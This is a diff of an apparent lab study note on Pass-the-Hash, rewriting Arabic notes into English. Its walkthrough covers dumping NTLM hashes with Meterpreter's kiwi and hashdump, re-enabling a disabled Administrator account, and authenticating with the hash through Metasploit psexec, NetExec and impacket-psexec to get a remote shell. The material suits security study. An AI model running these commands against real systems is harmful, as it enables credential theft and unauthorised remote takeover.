@@ -1,195 +1,366 @@
+# Pass-the-Hash (PtH)
 
-فكرته ببساطة:
+## What is Pass-the-Hash?
 
-```
-تستخدم الـ Hash بدل كلمة المرور للدخول
-```
-
-بدون الحاجة لمعرفة:
+Pass-the-Hash is an authentication technique where:
 
 ```
-الباسورد الحقيقي
+The NTLM Hash is used instead of the actual password.
 ```
 
-# كيف هذا ممكن؟ 
+Meaning:
 
-في ويندوز غالبًا:
+You do not need to know:
 
-- النظام يخزن NTLM Hash
-- ويستخدمه للمصادقة Authentication
+```
+The user's real password
+```
 
-بعض البروتوكولات مثل:
+You only need:
+
+```
+The NTLM Hash
+```
+
+---
+
+# How Does It Work?
+
+In Windows environments:
+
+- User passwords are stored as NTLM hashes.
+- During authentication, some protocols can use the hash itself.
+
+Protocols that may support Pass-the-Hash:
 
 - SMB
 - WinRM
 - PsExec
+- WMI
 
-تقبل:
-
-```
-الـ Hash مباشرة
-```
-
-# يعني بدل:
+Instead of:
 
 ```
 Password = Pass123
 ```
 
-أنت تستخدم:
+The attacker uses:
 
 ```
 NTLM Hash
 ```
 
-وتدخل به مباشرة.
+and authenticates directly.
 
-# لماذا هذا خطير جدًا؟ 
+---
 
-لأن المهاجم إذا سرق:
+# Why is Pass-the-Hash Dangerous?
+
+Because if an attacker obtains:
 
 ```
 NTLM Hash
 ```
 
-قد لا يحتاج:
+they may not need to:
 
 ```
-كسر الباسورد
+Crack the password
 ```
 
-أصلًا.
+at all.
 
-# من أين نحصل على الـ Hashes؟
+The hash itself can be enough to authenticate.
 
-غالبًا من:
+---
+
+# Sources of NTLM Hashes
+
+Hashes can be obtained from:
 
 - SAM Dump
 - Mimikatz
-- LSASS
+- LSASS Memory
 - Hashdump
 - Meterpreter
 
-# مثال NTLM Hash
+---
+
+# Example NTLM Hash
 
 ```
 aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
----
-
-
-# كيف يتم الاستغلال؟ 
-# باستخدام Metasploit 
+The format is:
 
 ```
+LM Hash : NTLM Hash
+```
+
+---
+
+# Exploitation Using Metasploit
+
+## PsExec Module
+
+Use:
+
+```text
 use exploit/windows/smb/psexec
 ```
 
-ثم:
+---
 
-```
+## Configure Username
+
+```text
 set SMBUser administrator
 ```
 
+---
 
-```
+## Provide NTLM Hash
+
+```text
 set SMBPass <NTLM_HASH>
 ```
 
+---
 
-```
+## Set Domain
+
+```text
 set SMBDomain WORKGROUP
 ```
 
+---
 
-```
+## Select Target
+
+```text
 set target Native upload
 ```
 
-ثم:
+---
 
-```
+## Run
+
+```text
 run
 ```
 
 ---
 
-# البروتوكولات المشهورة التي تدعم PtH 
+# Common Protocols Supporting Pass-the-Hash
 
-|البروتوكول|شائع؟|
+| Protocol | Support |
 |---|---|
-|SMB|جدًا|
-|PsExec|جدًا|
-|WinRM|نعم|
-|WMI|نعم|
+| SMB | Very common |
+| PsExec | Very common |
+| WinRM | Supported |
+| WMI | Supported |
 
 ---
- اذا حصلنا على جلسة  meterpreter  نستطيع ان نستخدم اداة kiwi  ونستخرج معلومات وهاشس
 
-عشان نشغل الاداه
+# Lab
+
+# Extracting Hashes Using Kiwi
+
+After obtaining a Meterpreter session, we can use Kiwi to extract credentials and hashes.
+
+---
+
+## Step 1: Load Kiwi
+
+Inside Meterpreter:
+
+```text
+load kiwi
+```
 
 ![[Pasted image 20260516012544.png]]
 
-عشان نستخرج الهاشس
+---
+
+## Step 2: Extract Hashes
+
+Use:
+
+```text
+lsa_dump_sam
+```
+
+or:
+
+```text
+hashdump
+```
 
 ![[Pasted image 20260516012612.png]]
 
-عشان نحصل على LM
+---
+
+## Step 3: Extract LM Hash
+
+Retrieve LM hashes from the SAM database.
 
 ![[Pasted image 20260516012854.png]]
 
-نستطيع ان نستخدم مديول يدعم التسجيل عبر الهاش 
-نستخدم هذا المديول للتسجيل عبر SMB
-exploit/windows/smb/psexec
-ضروري  عندما نستخدم هذا المديول نغير البورت عشان لا يتعارض مع الجلسة السابقة
+---
+
+# Using PsExec with Pass-the-Hash
+
+Now we can use a module that supports authentication using hashes.
+
+Load:
+
+```text
+use exploit/windows/smb/psexec
+```
+
+---
+
+## Important Note
+
+When using PsExec:
+
+Change the SMB port if necessary to avoid conflicts with an existing session.
 
 ![[Pasted image 20260516013606.png]]
 
-عندما نرسل الهاش نرسل الهاش كامل 
-NTML+LM
+---
+
+## Providing the Hash
+
+When passing the hash, provide the complete value:
+
+```
+LM Hash:NTLM Hash
+```
+
+Example:
+
+```
+aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
+```
 
 ![[Pasted image 20260516013745.png]]
 
+---
 
-اتضح انه  مستخدم الادمن معطل وعليه قيود
-فعلنا المستخدم وغيرنا الباسورد 
+# Enabling Disabled Administrator Account
 
-عشان نفعل الحساب
+The Administrator account was disabled or restricted.
 
-```
+We enabled it:
+
+```cmd
 net user Administrator /active:yes
 ```
 
-عشان نغير الرمز
+---
 
-```
+## Changing the Password
+
+```cmd
 net user Administrator Pass123!
 ```
 
-بعدين نسخنا الباسورد من جديد
+---
 
-وسجلنا الدخول
+After changing the password, we retrieved the hash again and successfully authenticated.
 
 ![[Pasted image 20260516015120.png]]
 
-
 ---
- نستطيع ايضا عبر اداة  Net exec  ان نسجل باستخدام الهاش
- لما يظهر لنا Pwn3d!  هذا يعني نستطيع ان نفعل اي شيء
- 
+
+# Pass-the-Hash Using NetExec (NXC)
+
+NetExec can also authenticate using NTLM hashes.
+
+Example:
+
+```bash
+nxc smb TARGET -u Administrator -H NTLM_HASH
+```
+
+If the result shows:
+
+```
+Pwn3d!
+```
+
+It means:
+
+```
+The account has administrative privileges.
+```
+
 ![[Pasted image 20260516015902.png]]
 
-عشان ننفذ امر معين
+---
+
+# Execute Commands Using NXC
+
+NetExec can execute commands remotely when valid hash authentication is available.
+
+Example:
+
+```bash
+nxc smb TARGET -u Administrator -H HASH -x "command"
+```
 
 ![[Pasted image 20260516020052.png]]
 
-عشان نحصل على الهاشس
+---
+
+# Extracting Hashes Using NXC
+
+NetExec can also retrieve hashes if sufficient privileges are available.
 
 ![[Pasted image 20260516020332.png]]
 
 ---
-لو اردنا ان ندخل باستخدام الهاش ليس مجرد اختبار اوامر كما في nxc 
-نستخدم سكربتات  impacket
+
+# Using Impacket for Full Access
+
+If the goal is not only testing authentication but obtaining an interactive shell, use Impacket scripts.
+
+Example:
+
+```bash
+impacket-psexec Administrator@TARGET -hashes LM:NTLM
+```
+
 ![[Pasted image 20260516020725.png]]
-كذه حصلنا على تحكم كامل باستخدام الهاش
+
+---
+
+# Result
+
+A full remote shell is obtained using:
+
+```
+NTLM Hash
+```
+
+without knowing the actual password.
+
+---
+
+# Key Takeaways
+
+- Pass-the-Hash allows authentication using NTLM hashes instead of passwords.
+- The attacker does not need to crack the password.
+- Common sources of hashes:
+  - SAM
+  - LSASS
+  - Mimikatz
+  - Meterpreter
+- SMB and PsExec are the most common attack paths.
+- Tools supporting PtH:
+  - Metasploit
+  - NetExec
+  - Impacket
+- A stolen NTLM hash can provide the same access level as knowing the original password.
